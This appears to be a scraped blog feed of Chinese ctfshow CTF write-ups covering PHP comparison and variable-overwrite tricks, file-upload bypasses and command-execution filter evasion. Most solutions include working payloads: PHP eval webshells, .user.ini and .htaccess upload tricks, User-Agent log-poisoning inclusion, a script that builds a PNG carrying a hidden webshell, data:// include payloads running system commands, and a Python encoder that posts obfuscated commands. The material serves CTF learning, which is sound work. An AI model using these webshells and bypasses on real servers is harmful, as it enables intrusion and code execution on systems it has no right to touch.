https://ctfer.com*/highlight_file(__FILE__);include(&quot;ctfshow.php&quot;);//flag in class ctfshow;$ctfshow = new ctfshow();$v1=$_GET[&#x27;v1&#x27;];$v2=$_GET[&#x27;v2&#x27;];$v3=$_GET[&#x27;v3&#x27;];$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);if($v0)&#123; if(!preg_match(&quot;/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\*|\\)|\\-|\\_|\\+|\\=|\\&#123;|\\[|\\&quot;|\\&#x27;|\\,|\\.|\\;|\\?|[0-9]/&quot;, $v2))&#123; if(!preg_match(&quot;/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\*|\\(|\\-|\\_|\\+|\\=|\\&#123;|\\[|\\&quot;|\\&#x27;|\\,|\\.|\\?|[0-9]/&quot;, $v3))&#123; eval(&quot;$v2(&#x27;ctfshow&#x27;)$v3&quot;); &#125; &#125; &#125;?&gt; 涉及到了序列化知识，反射类，漏洞跟前面一样，但给v2，v3设置了一堆过滤，不能用正常rce了 需要了解一个知识:ReflectionClass,通俗来讲就是可以通过一个对象来获取所属类的具体内容 这里直接echo new ReflectionClass(‘ctfshow’)就把ctfshow的类信息调出 payload:GET: xxx/?v1=1&amp;v2=echo new ReflectionClass&amp;v3=; web102&lt;?php/*# -*- coding: utf-8 -*-# @Author: atao# @Date: 2020-09-16 11:25:09# @Last Modified by: h1xa# @Last Modified time: 2020-09-23 20:59:43*/highlight_file(__FILE__);$v1 = $_POST[&#x27;v1&#x27;];$v2 = $_GET[&#x27;v2&#x27;];$v3 = $_GET[&#x27;v3&#x27;];$v4 = is_numeric($v2) and is_numeric($v3);if($v4)&#123; $s = substr($v2,2); $str = call_user_func($v1,$s); echo $str; file_put_contents($v3,$str);&#125;else&#123; die(&#x27;hacker&#x27;);&#125;?&gt; 先了解新遇到的函数 substr($v2,2) 默认substr(内容，起点，终点) substr(&#x27;123456&#x27;,2)=3456 这里将v2的前两位去掉后赋值给$s call_user_func($v1,$s) call_user_func(a,b),简单理解起来就是说，对b使用a方法 call_user_func(a,b)&#x3D; a(b) ，懂？ 所以我们想到的方法是，v2必须是数字，先找一个rce语句，先base64，在全url转码，前面带两个不需要的数 问题难在这个语句，因url编码后，仅能出现0-9，最多一个e，这样才能满足v2是数字，翻了翻别的wp，看到了 115044383959474e6864434171594473 这串数字，去掉开头两位后，再base64解码，正好是一个rce语句，且不含别的字母 v1&#x3D;hex2bin,hex2bin()这个函数可以将url编码转回字母 file_put_contents($v3,$str); 接下来将v1(s)的内容写入v3，这之间还需要再进行一次base64解码，所有v3中传入伪协议写入，之后再访问该文件 payload:GET: xxx/?v2=115044383959474e6864434171594473&amp;v3=php://filter/write=convert.base64-decode/resource=2.phpPOST:v1=hex2bin web103&lt;?php/*# -*- coding: utf-8 -*-# @Author: atao# @Date: 2020-09-16 11:25:09# @Last Modified by: h1xa# @Last Modified time: 2020-09-23 21:03:24*/highlight_file(__FILE__);$v1 = $_POST[&#x27;v1&#x27;];$v2 = $_GET[&#x27;v2&#x27;];$v3 = $_GET[&#x27;v3&#x27;];$v4 = is_numeric($v2) and is_numeric($v3);if($v4)&#123; $s = substr($v2,2); $str = call_user_func($v1,$s); echo $str; if(!preg_match(&quot;/.*p.*h.*p.*/i&quot;,$str))&#123; file_put_contents($v3,$str); &#125; else&#123; die(&#x27;Sorry&#x27;); &#125;&#125;else&#123; die(&#x27;hacker&#x27;);&#125;?&gt; 中间有一串奇怪的过滤 preg_match(“&#x2F;.*p.*h.p.&#x2F;i”,$str)，但他对str进行正则匹配，但我们的str是一串base64，不会运气差到出现pxxxhxxxp这么怪的base64，所以上面的还能用 payload:GET: xxx/?v2=115044383959474e6864434171594473&amp;v3=php://filter/write=convert.base64-decode/resource=2.phpPOST:v1=hex2bin web104&lt;?php/*# -*- coding: utf-8 -*-# @Author: atao# @Date: 2020-09-16 11:25:09# @Last Modified by: h1xa# @Last Modified time: 2020-09-28 22:27:20*/highlight_file(__FILE__);include(&quot;flag.php&quot;);if(isset($_POST[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123; $v1 = $_POST[&#x27;v1&#x27;]; $v2 = $_GET[&#x27;v2&#x27;]; if(sha1($v1)==sha1($v2))&#123; echo $flag; &#125;&#125;?&gt; 很简单一题目，就是传入两个值，然后进行sha1比较，因为题目没有设置对原本的v1和v2进行比较，所以传入两个相同的值就行了，不需要看漏洞 payload:GET:XXX/?v2=1POST: v1=1 web105&lt;?php/*# -*- coding: utf-8 -*-# @Author: Firebasky# @Date: 2020-09-16 11:25:09# @Last Modified by: h1xa# @Last Modified time: 2020-09-28 22:34:07*/highlight_file(__FILE__);include(&#x27;flag.php&#x27;);error_reporting(0);$error=&#x27;你还想要flag嘛？&#x27;;$suces=&#x27;既然你想要那给你吧！&#x27;;foreach($_GET as $key =&gt; $value)&#123; if($key===&#x27;error&#x27;)&#123; die(&quot;what are you doing?!&quot;); &#125; $$key=$$value;&#125;foreach($_POST as $key =&gt; $value)&#123; if($value===&#x27;flag&#x27;)&#123; die(&quot;what are you doing?!&quot;); &#125; $$key=$$value;&#125;if(!($_POST[&#x27;flag&#x27;]==$flag))&#123; die($error);&#125;echo &quot;your are good&quot;.$flag.&quot;\\n&quot;;die($suces);?&gt; 非常绕的一道题，因为flag的输出不在 echo &quot;your are good&quot;.$flag.&quot;\\n&quot;;die($suces); 而在 if(!($_POST[&#x27;flag&#x27;]==$flag))&#123; die($error); 这道题的核心步骤，是构造一个 error=suces=flag 造成这题的误区，可能是没注意到error和suces这两个题目给定的参数内容是可更改的 先看新函数foreach() 这是一个数列遍历函数 foreach($_GET as $key =&gt; $value)&#123; if($key===&#x27;error&#x27;)&#123; die(&quot;what are you doing?!&quot;); &#125; $$key=$$value;&#125; 将GET传入的值作为健值，去遍历数组 如果键值等于error，结束并返回一个what are you doing?! 就是说，我们get传参的内容不能带有error foreach($_POST as $key =&gt; $value)&#123; if($value===&#x27;flag&#x27;)&#123; die(&quot;what are you doing?!&quot;); &#125; $$key=$$value;&#125; 这个同理，就是说post传参内容不能带有flag if(!($_POST[&#x27;flag&#x27;]==$flag))&#123; die($error);&#125; 当post传入的flag不等于ctfshow{xxxx}时候，就会结束并返回一个error 所以这题的思路是，get不能带error，所有get改变suces，post不能带flag，所以在get中给suces中传入flag 这时候返回的error就是$flag payload:GET:suces=flagPOST:error=suces 这里需要注意的是,之所以这里变成的是$error&#x3D;$suces,而不是等于字符串’suces’，是因为有 $$key&#x3D;$$value，这串双$$，直接覆盖赋值，直接让参数等于别的参数中的值，$suces&#x3D;$flag也是同理 web106&lt;?php/*# -*- coding: utf-8 -*-# @Author: atao# @Date: 2020-09-16 11:25:09# @Last Modified by: h1xa# @Last Modified time: 2020-09-28 22:38:27*/highlight_file(__FILE__);include(&quot;flag.php&quot;);if(isset($_POST[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123; $v1 = $_POST[&#x27;v1&#x27;]; $v2 = $_GET[&#x27;v2&#x27;]; if(sha1($v1)==sha1($v2) &amp;&amp; $v1!=$v2)&#123; echo $flag; &#125;&#125;?&gt; 这里跟上面的就不一样了，因为还有一个v1!&#x3D;v2 这里我们使用跟前面一样的数组绕过，跟md5一样，各种值的转换，数组是直接变成0的，所有这里直接用数组 payload:GET:v2[]=2POST:v1[]=1 web107&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-16 11:25:09# @Last Modified by: h1xa# @Last Modified time: 2020-09-28 23:24:14*/highlight_file(__FILE__);error_reporting(0);include(&quot;flag.php&quot;);if(isset($_POST[&#x27;v1&#x27;]))&#123; $v1 = $_POST[&#x27;v1&#x27;]; $v3 = $_GET[&#x27;v3&#x27;]; parse_str($v1,$v2); if($v2[&#x27;flag&#x27;]==md5($v3))&#123; echo $flag; &#125;&#125;?&gt; 这里给我晕了好久，什么叫v2[‘flag’],flag从哪来的？翻了翻才知道，这里flag是需要我们自己传入的 v1=flag=202cb962ac59075b964b07152d234b70parse_str($v1,$v2)这样v2[&#x27;flag&#x27;]=202cb962ac59075b964b07152d234b70 后面再将v3传入就行了 parse_str()起到一个类似数组整理的作用 echo $v2v2= [&#x27;flag&#x27; =&gt; &#x27;202cb962ac59075b964b07152d234b70&#x27;]; web108&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-16 11:25:09# @Last Modified by: h1xa# @Last Modified time: 2020-09-28 23:53:55*/highlight_file(__FILE__);error_reporting(0);include(&quot;flag.php&quot;);if (ereg (&quot;^[a-zA-Z]+$&quot;, $_GET[&#x27;c&#x27;])===FALSE) &#123; die(&#x27;error&#x27;);&#125;//只有36d的人才能看到flagif(intval(strrev($_GET[&#x27;c&#x27;]))==0x36d)&#123; echo $flag;&#125;?&gt; if (ereg (&quot;^[a-zA-Z]+$&quot;, $_GET[&#x27;c&#x27;])===FALSE) &#123; die(&#x27;error&#x27;); 重点看这句， 想要通过这段判断，需要让 ereg (&quot;^[a-zA-Z]+$&quot;, $_GET[&#x27;c&#x27;] 为true ereg (&quot;^[a-zA-Z]+$&quot;) 要求传入的值，开头结尾都要是字母，中间也不能包含别的内容 再看输出flag的条件 if(intval(strrev($_GET[&#x27;c&#x27;]))==0x36d)&#123; echo $flag;&#125; 对c这个字符串进行翻转，要求c的值与0x36d(877)若比较相同，但前面要求首位都是字母，中间也不能有数字 这时候需要用到00截断，对于传入的字符串，系统以%00结尾，我们手动传入00，让系统认为后面没东西了，但实则后面还有我们的数字 payload:GET:c=a%00778","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://example.com/tags/ctf/"}]},{"title":"ctfshow 文件上传(web151-170)已完结","slug":"CTFwp/ctfshow文件上传(web151-170)更新中","date":"2025-07-09T16:00:00.000Z","updated":"2025-07-10T13:32:06.380Z","comments":true,"path":"2025/07/10/CTFwp/ctfshow文件上传(web151-170)更新中/","permalink":"http://example.com/2025/07/10/CTFwp/ctfshow%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0(web151-170)%E6%9B%B4%E6%96%B0%E4%B8%AD/","excerpt":"","text":"web151文件上传的第一题，只有一个绕过 写马 &lt;?= @eval($_POST[&#x27;x&#x27;]); echo(&#x27;luck&#x27;);?&gt; 署名1.png，这样上传时用burpsuite拦截，把png改回php， 可浏览&#x2F;upload&#x2F;1.php看回显，出现luck说明上传成功 接着使用蚁剑链接，翻flag web152-155.user.ini的使用 首先要用.user.ini.,在upload的文件夹中，至少有一个php文件，否则不可用 我们先浏览&#x2F;upload，有回显，盲猜index.php，之后的链接蚁剑等工作都在&#x2F;upload&#x2F;index.php中 首先上传.user.ini auto_prepend_file=2.png 上传成功后，之后直接上传2.png，不需要拦截 之后直接访问&#x2F;upload&#x2F;index.php即可 这几题都是各种过滤，我们采用在图片中写马，传入后用蚁剑链接，翻到flag 各种过滤，最后得到综合的2.png &lt;?=eval($_POST[1])?&gt; web156-157把[]过滤了，我们可以试着采用别的指令 之前都是传马用蚁剑链接，这次可以试着直接上传读取flag的指令， &lt;?=system(&#x27;cat /var/www/html/flag.???&#x27;)?&gt; &#x2F;var&#x2F;www&#x2F;html是默认的路径，我们可以试着猜一下路径，直接用cat读取出flag web158-160学一个更猛的，联系到直接文件包含漏洞中的日志包含漏洞 首先常规上传user.ini，接着传2.png &lt;?=include&quot;/var/lo&quot;.&quot;g/nginx/access.lo&quot;.&quot;g?&gt; 把这个传上去的时候，用burpsuite拦截，在UA里写马，接着可以用蚁剑链接或者post各种指令得到flag web161开头检查，要加一个 GIF89a 就能绕过了 GIF89a&lt;?=include&quot;/var/lo&quot;.&quot;g/nginx/access.lo&quot;.&quot;g?&gt; .user.ini也要加 ，用前面的日志包含，得到flag web162“.”，被禁，构造一个“.”， GIF89a&lt;?=$a=&quot;]&quot;?&gt;&lt;?=$d=&quot;s&quot;?&gt;&lt;?=$b=$d^$a?&gt;&lt;?=$g=&quot;l&quot;?&gt;&lt;?=$o=&quot;o&quot;?&gt;&lt;?=$c=&quot;g&quot;?&gt;&lt;?=include&quot;/var/$g$o$c/nginx/access$b$g$o$c&quot;?&gt; 还是用日志包含，得到flag web163哥我真不会 web164上传结束后，已经看不见路径了，但还能下载图片，这时候就可以使用二次渲染， 首先构造一张png图片马 &lt;?php$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23, 0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae, 0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc, 0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f, 0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c, 0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d, 0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1, 0x66, 0x44, 0x50, 0x33);$img = imagecreatetruecolor(32, 32);for ($y = 0; $y &lt; sizeof($p); $y += 3) &#123; $r = $p[$y]; $g = $p[$y+1]; $b = $p[$y+2]; $color = imagecolorallocate($img, $r, $g, $b); imagesetpixel($img, round($y / 3), 0, $color);&#125;imagepng($img,&#x27;2.png&#x27;); //要修改的图片的路径/* 木马内容&lt;?$_GET[0]($_POST[1]);?&gt; */?&gt; 运行后，得到一张图片马，2.png 接着上传后，点查看图片，用hackbar传参， www.xxxx/xxx.png?0=system 用post传1，RCE得到flag 下载图片，用文本打开 塒NG\u001a IHDR \b\u0002 ?恚 pHYs \u000e? \u000e??\u000e\u001b `IDATH塩\\download.phpflag.phpimagesindex.phpjslayuiuploadupload.phpupload.phpX€亖羢^7擖弸踾_觹?黢闵縚?|?0c俟g=\u001b?寕Q0F?\u0018\u0005\u0014寕Q0? 伈\u001b\u0002 x IEND瓸`? 成功了，接着执行命令，得到flag web165这次用的是jpg图片马，其他跟上面一样 web166操作跟上面差不多 这压缩包一直写一个马改个后缀就能传上去了 后面接RCE web167这题可以用.htaccess 意思是说，先上传.htaccess，然后再直接传图片文件，图片文件会已php形式被解析 Sethandler application/x-httpd-php 首先是一个修改后缀绕过jpg，然后直接上传.htaccess和webshell.png 蚁剑链接得到flag web168基础免杀，先上传一个普通的png，用bp拦截， 发送到repeater，把内容删掉，后缀改成php，然后往里面写php语句，因为这次没有下载，而是查看 所以应该是每写一句，用repeater发送一句，接着在浏览器里刷新看回显 接着就是普通的RCE system，eval什么都被禁了， 构造payload &lt;?= `ls`?&gt;&lt;?= `ls /`?&gt;&lt;?= `ls ../`?&gt;&lt;?= `cat flagaa.php`?&gt; 得到flag web169-170玩什么高级免杀，换一招 这次看upload&#x2F;index.php，发现没了，我们可以赌一下，自己上传一个，万一不改名，被系统当自己文件了呢 这次很怪，前端要求类型是zip，后端却要求png，所以上传的东西先改后缀，再在bp里改成image&#x2F;png 先传index.php 发现真的没改名，可以在&#x2F;upload&#x2F;index.php浏览 接着传user.ini 改的地方有四处 UA:&lt;?= eval(&amp;_POST[])?&gt; //直接在ua里传马 内容：GIF89aauto_prepend_file=/var/log/nginx/access.log //写入日志包含地址 类型：.ini image/png 传进去，打开&#x2F;upload&#x2F;index.php，意外发现真的有日志，之后蚁剑链接得到flag 完结完结，真的坐牢。","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://example.com/tags/ctf/"}]},{"title":"ctfshow 命令执行(web29-77,118-124)更新中","slug":"CTFwp/ctfshow命令执行(29-77,118-124)","date":"2025-07-06T16:00:00.000Z","updated":"2025-07-07T13:50:27.850Z","comments":true,"path":"2025/07/07/CTFwp/ctfshow命令执行(29-77,118-124)/","permalink":"http://example.com/2025/07/07/CTFwp/ctfshow%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C(29-77,118-124)/","excerpt":"","text":"web29&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-04 00:12:34# @Last Modified by: h1xa# @Last Modified time: 2020-09-04 00:26:48# @email: h1xa@ctfer.com# @link: https://ctfer.com*/error_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123; $c = $_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/flag/i&quot;, $c))&#123; eval($c); &#125; &#125;else&#123; highlight_file(__FILE__);&#125; 只过滤了flag和大小写 构造payload ?c=system(&quot;ls&quot;);?c=system(&quot;tac f*&quot;); 拿到flag ctfshow&#123;6d1da9c5-aa80-41c1-aca0-6dfb3ec8a7ea&#125; web30&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-04 00:12:34# @Last Modified by: h1xa# @Last Modified time: 2020-09-04 00:42:26# @email: h1xa@ctfer.com# @link: https://ctfer.com*/error_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123; $c = $_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/flag|system|php/i&quot;, $c))&#123; eval($c); &#125; &#125;else&#123; highlight_file(__FILE__);&#125; 过滤了flag，system，php，大小写 system可用passthru或者echo(&#96;&#96;)代替， 构造payload ?c=echo(`ls`);?c=echo(`tac f*`); 拿到flag ctfshow&#123;a14dacd0-b579-4d77-a64f-1ddc760722c1&#125; web31&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-04 00:12:34# @Last Modified by: h1xa# @Last Modified time: 2020-09-04 00:49:10# @email: h1xa@ctfer.com# @link: https://ctfer.com*/error_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123; $c = $_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\\.| |\\&#x27;/i&quot;, $c))&#123; eval($c); &#125; &#125;else&#123; highlight_file(__FILE__);&#125; 过滤了flag，system，php，cat，sort，shell，.,空格，‘，大小写 用%09(tab)代替空格， 构造payload ?c=echo(`ls`);?c=echo(`tac%09f*`); 拿到flag ctfshow&#123;7cca93ab-0233-48d6-9534-ed516600e091&#125; web32&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-04 00:12:34# @Last Modified by: h1xa# @Last Modified time: 2020-09-04 00:56:31# @email: h1xa@ctfer.com# @link: https://ctfer.com*/error_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123; $c = $_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\\.| |\\&#x27;|\\`|echo|\\;|\\(/i&quot;, $c))&#123; eval($c); &#125; &#125;else&#123; highlight_file(__FILE__);&#125; 相比web31，更多过滤了echo,,;,( 尝试使用文件包含绕过 ?c=include$_GET[b]?&gt;&amp;b=data://text/plain,&lt;?php system(&quot;ls&quot;);?&gt;?c=include$_GET[b]?&gt;&amp;b=data://text/plain,&lt;?php system(&quot;tac flag.php&quot;);?&gt; 得到flag ctfshow&#123;ee520f6e-ba0a-4c01-9411-05a02420baeb&#125; web33&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-04 00:12:34# @Last Modified by: h1xa# @Last Modified time: 2020-09-04 02:22:27# @email: h1xa@ctfer.com# @link: https://ctfer.com*///error_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123; $c = $_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\\.| |\\&#x27;|\\`|echo|\\;|\\(|\\&quot;/i&quot;, $c))&#123; eval($c); &#125; &#125;else&#123; highlight_file(__FILE__);&#125; 一招鲜，吃遍天 构造payload ?c=include$_GET[b]?&gt;&amp;b=data://text/plain,&lt;?php system(&quot;ls&quot;);?&gt;?c=include$_GET[b]?&gt;&amp;b=data://text/plain,&lt;?php system(&quot;tac f*&quot;);?&gt; 得到flag ctfshow&#123;078e0c80-b526-41ad-80a3-426b1faced5a&#125; web34&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-04 00:12:34# @Last Modified by: h1xa# @Last Modified time: 2020-09-04 04:21:29# @email: h1xa@ctfer.com# @link: https://ctfer.com*/error_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123; $c = $_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\\.| |\\&#x27;|\\`|echo|\\;|\\(|\\:|\\&quot;/i&quot;, $c))&#123; eval($c); &#125; &#125;else&#123; highlight_file(__FILE__);&#125; 多禁了个：，没影响，一招鲜，吃遍天 ?c=include$_GET[b]?&gt;&amp;b=data://text/plain,&lt;?php system(&quot;ls&quot;);?&gt;?c=include$_GET[b]?&gt;&amp;b=data://text/plain,&lt;?php system(&quot;tac f*&quot;);?&gt; 得到flag ctfshow&#123;c6471ed6-6e2c-4103-8171-2d1d6298f9e3&#125; web35&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-04 00:12:34# @Last Modified by: h1xa# @Last Modified time: 2020-09-04 04:21:23# @email: h1xa@ctfer.com# @link: https://ctfer.com*/error_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123; $c = $_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\\.| |\\&#x27;|\\`|echo|\\;|\\(|\\:|\\&quot;|\\&lt;|\\=/i&quot;, $c))&#123; eval($c); &#125; &#125;else&#123; highlight_file(__FILE__);&#125; 一招鲜，吃遍天 ?c=include$_GET[b]?&gt;&amp;b=data://text/plian,&lt;?= system(&quot;tac f*&quot;);?&gt; 得到flag ctfshow&#123;9802f18a-bb60-45b7-b3e2-e72894a4f1b7&#125; web36&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-04 00:12:34# @Last Modified by: h1xa# @Last Modified time: 2020-09-04 04:21:16# @email: h1xa@ctfer.com# @link: https://ctfer.com*/error_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123; $c = $_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\\.| |\\&#x27;|\\`|echo|\\;|\\(|\\:|\\&quot;|\\&lt;|\\=|\\/|[0-9]/i&quot;, $c))&#123; eval($c); &#125; &#125;else&#123; highlight_file(__FILE__);&#125; 多禁用了数字，一招鲜吃遍天 ?c=include$_GET[b]?&gt;&amp;b=data://text/plain,&lt;?= system(&quot;ls&quot;);?&gt;?c=include$_GET[b]?&gt;&amp;b=data://text/plain,&lt;?= system(&quot;tac f*&quot;);?&gt; 得到flag ctfshow&#123;ab182bac-0440-438a-9479-3a50e21354b6&#125; web37&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-04 00:12:34# @Last Modified by: h1xa# @Last Modified time: 2020-09-04 05:18:55# @email: h1xa@ctfer.com# @link: https://ctfer.com*///flag in flag.phperror_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123; $c = $_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/flag/i&quot;, $c))&#123; include($c); echo $flag; &#125; &#125;else&#123; highlight_file(__FILE__);&#125; 从这开始就跟文件包含很像了 构造payload ?c=data://text/plain,&lt;php= system(&quot;tac f*&quot;);?&gt; 得到flag ctfshow&#123;25683191-dc1b-4628-8957-a54c4c633341&#125; web38&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-04 00:12:34# @Last Modified by: h1xa# @Last Modified time: 2020-09-04 05:23:36# @email: h1xa@ctfer.com# @link: https://ctfer.com*///flag in flag.phperror_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123; $c = $_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/flag|php|file/i&quot;, $c))&#123; include($c); echo $flag; &#125; &#125;else&#123; highlight_file(__FILE__);&#125; 过滤了php 构造payload ?c=data://text/plain,&lt;?= system(&quot;tac f*&quot;);?&gt; 得到flag ctfshow&#123;1d7d8f52-2253-40b7-826c-06b8d6d88800&#125; web39&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-04 00:12:34# @Last Modified by: h1xa# @Last Modified time: 2020-09-04 06:13:21# @email: h1xa@ctfer.com# @link: https://ctfer.com*///flag in flag.phperror_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123; $c = $_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/flag/i&quot;, $c))&#123; include($c.&quot;.php&quot;); &#125; &#125;else&#123; highlight_file(__FILE__);&#125; 照样能用 ?c=data://text/plain,&lt;?= system(&quot;tac f*&quot;);?&gt; 得到flag ctfshow&#123;a32ae679-0b72-47e4-b938-f04da301825c&#125; web40&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-04 00:12:34# @Last Modified by: h1xa# @Last Modified time: 2020-09-04 06:03:36# @email: h1xa@ctfer.com# @link: https://ctfer.com*/if(isset($_GET[&#x27;c&#x27;]))&#123; $c = $_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/[0-9]|\\~|\\`|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\（|\\）|\\-|\\=|\\+|\\&#123;|\\[|\\]|\\&#125;|\\:|\\&#x27;|\\&quot;|\\,|\\&lt;|\\.|\\&gt;|\\/|\\?|\\\\\\\\/i&quot;, $c))&#123; eval($c); &#125; &#125;else&#123; highlight_file(__FILE__);&#125; 拿到题目，被过滤的东西有不少，仔细一看，之前能用的符号基本都被禁了，但自习一看还给留了一对(),禁用的是中文（），这就需要我们采用各种函数构造payload 这里先记住一个payload ?c=eval(next(reset(get_defined_vars()));&amp;1=system(&quot;ls&quot;);?c=eval(next(reset(get_defined_vars()));&amp;1=system(&quot;tac f*&quot;); 然后接着看这些函数的作用 eval()//代码执行next()//这个函数将数组内部指针向前移动一位，并返回当前指针处的元素值。reset()//这个函数将数组内部指针指向第一个元素，并返回该元素的值。get_defined_vars()//这个函数返回当前所有已定义变量的数组，包括局部变量和全局变量。 第二种方法，比较容易理解 ?c=highlight_file(next(array_reverse(scandir(getcwd())))); 分析为什么这么做 首先我们要看目录 使用 ?c=print_r(scandir(getcwd())); 我们得到 Array ( [0] =&gt; . [1] =&gt; .. [2] =&gt; flag.php [3] =&gt; index.php ) 这时候，我们使用翻转数组的函数array_reverse，数组就会变成 Array ( [0] =&gt; index.php [1] =&gt; flag.php [2] =&gt; .. [3] =&gt; . ) 接下来就是读取[1]中的数据 使用next(),指向[1]，再用highlight_file读取flag 但这个方法如果flag在中间，不好轻易得到就不好用了 得到flag ctfshow&#123;b93dd03b-4a96-4443-932b-c298d5ba0f28&#125; web41与或非绕过 &lt;?php/*# -*- coding: utf-8 -*-# @Author: 羽# @Date: 2020-09-05 20:31:22# @Last Modified by: h1xa# @Last Modified time: 2020-09-05 22:40:07# @email: 1341963450@qq.com# @link: https://ctf.show*/if(isset($_POST[&#x27;c&#x27;]))&#123; $c = $_POST[&#x27;c&#x27;];if(!preg_match(&#x27;/[0-9]|[a-z]|\\^|\\+|\\~|\\$|\\[|\\]|\\&#123;|\\&#125;|\\&amp;|\\-/i&#x27;, $c))&#123; eval(&quot;echo($c);&quot;); &#125;&#125;else&#123; highlight_file(__FILE__);&#125;?&gt; 没有禁用|,借助脚本 import reimport urllibfrom urllib import parseimport requests# 初始化一个列表来存储编码后的字符信息contents = []# 遍历所有可能的ASCII字符（从0x00到0xFF）for i in range(256): for j in range(256): # 将整数i和j转换为两位的十六进制字符串（如：&#x27;00&#x27;到&#x27;ff&#x27;） hex_i = &#x27;&#123;:02x&#125;&#x27;.format(i) hex_j = &#x27;&#123;:02x&#125;&#x27;.format(j) # 编译一个正则表达式，用于检测需要特殊处理的字符 preg = re.compile(r&#x27;[0-9]|[a-z]|\\^|\\+|~|\\$|\\[|]|\\&#123;|&#125;|&amp;|-&#x27;, re.I) # 如果当前字符是需要特殊处理的字符，则跳过本次循环 if preg.search(chr(int(hex_i, 16))) or preg.search(chr(int(hex_j, 16))): continue # 否则，将字符转换为百分号编码格式（如：&#x27;%20&#x27;代表空格） a = &#x27;%&#x27; + hex_i b = &#x27;%&#x27; + hex_j # 计算两个十六进制值按位或运算的结果，并确保结果是一个可打印的字符 c = chr(int(a[1:], 16) | int(b[1:], 16)) # 只保留ASCII码在32到126之间的字符（即可打印字符） if 32 &lt;= ord(c) &lt;= 126: contents.append([c, a, b]) # 将字符、其百分号编码形式以及备用编码形式添加到列表中# 定义一个函数，用于生成payloaddef make_payload(cmd): payload1 = &#x27;&#x27; # 初始化第一个payload字符串 payload2 = &#x27;&#x27; # 初始化第二个payload字符串 # 遍历给定命令的每一个字符 for char in cmd: # 在contents列表中查找与当前字符匹配的项 for item in contents: if char == item[0]: # 如果找到了匹配的项 payload1 += item[1] # 添加其百分号编码形式到payload1 payload2 += item[2] # 添加其备用编码形式到payload2 break # 找到匹配项后跳出循环 # 返回一个字符串，其中包含了原始的和备用的十六进制编码，以括号包围 return &#x27;(&quot;&#x27; + payload1 + &#x27;&quot;|&quot;&#x27; + payload2 + &#x27;&quot;)&#x27;# 获取用户输入的URLURL = input(&#x27;url:&#x27;)# 创建payload，首先对&#x27;系统&#x27;命令进行编码，然后对&#x27;cat flag.php&#x27;命令进行编码payload = make_payload(&#x27;system&#x27;) + make_payload(&#x27;cat flag.php&#x27;)# 发送POST请求到指定的URL，数据中包含编码后的payloadresponse = requests.post(URL, data=&#123;&#x27;c&#x27;: urllib.parse.unquote(payload)&#125;, verify=False)# 输出服务器的响应文本print(response.text) 得到flag ctfshow&#123;fb643932-138c-459d-982c-1940774a9003&#125; web42&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-05 20:49:30# @Last Modified by: h1xa# @Last Modified time: 2020-09-05 20:51:55# @email: h1xa@ctfer.com# 